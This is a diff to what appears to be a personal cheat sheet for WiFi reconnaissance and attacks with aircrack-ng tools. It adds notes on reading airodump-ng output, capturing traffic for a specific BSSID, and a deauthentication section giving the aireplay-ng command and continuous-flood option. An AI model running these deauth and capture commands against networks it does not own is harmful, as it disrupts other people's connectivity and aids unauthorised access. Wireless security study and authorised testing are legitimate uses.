@@ -7,10 +7,6 @@ Grab all networks nearby:
 ```
 iwlist wlan1 s | grep 'Cell\|Quality\|ESSID\|IEEE\|Mode\|Frequency\|Channel\|Quality\|Signal Level' | tee wifi_scan.txt
 ```
-Restart NetworkManager
-```
-systemctl restart NetworkManager
-```
 
 ---
 
@@ -38,7 +34,10 @@ Run a test:
 sudo aireplay-ng --test wlan1mon
 ```
 Should see `Injection is working!`
-
+Restart NetworkManager
+```
+systemctl restart NetworkManager
+```
 Save what's out there and save to a file:
 ```
 sudo airodump-ng wlan1mon --band agp -w dump
@@ -55,12 +54,20 @@ Stop monitor mode:
 ```
 sudo airmon-ng stop wlan0mon
 ```
+- `BSSID` column are Access Points (AP)
+- `STATION`column are Clients trying to access APs
+- `Probes` are telling you what the client is trying to connect to (if any)
+- (not associated) means that the client is powered on with WiFi enabled, visible to your monitoring interface but NOT connected to any AP in the area. It just happens to be on the same channel
 
 ## Airodump-ng
 Dump network traffic to file:
 airodump-ng is configured to scan exclusively for networks operating on the 2.4 GHz band so use `--band abg` if necessary
 ```
 sudo airodump-ng wlan1mon --band a -w dump
+```
+For a specific BSSID:
+```
+sudo airodump-ng wlan1mon --bssid [] --channel [] -w dump
 ```
 
 ## Airgraph-ng
@@ -80,7 +87,7 @@ sudo aireplay-ng --test wlan0mon
 
 ## Aireplay-ng
 ```
-sudo aireplay-ng
+aireplay-ng
 ```
 ```
 sudo aireplay-ng -0 5 -a ACCESSPOINTBSSID -c CLIENTBSSID wlan1mon
@@ -114,8 +121,22 @@ Decrypt WPA:
 sudo airdecap-ng -p <passphrase> <capture-file> -e <essid>
 ```
 
+## Deauth
+- `5` is the number of deauth packets, `0` would be to send them continously.
+- `-0` = deauth attack (`--deauth` would also work here)
+```
+sudo aireplay-ng -0 5 -a ACCESSPOINT-BSSID -c CLIENT-BSSID wlan1mon
+```
+You have to be on the same channel as the AP you're deauthing, change it with:
+```
+iwconfig wlan1mon channel X
+```
+
 # EXTRAS
-Note that it is possible to connect to APs via CLI
+- Note that it is possible to connect to APs via CLI
+- Your phone will randomise it's MAC address when it connects to a network, you can see it `Wifi` --> `Settings` --> `View more`
+
+
 ## Rasberry Pi MAC address ranges:
 ```
 28:CD:C1:xx:xx:xx
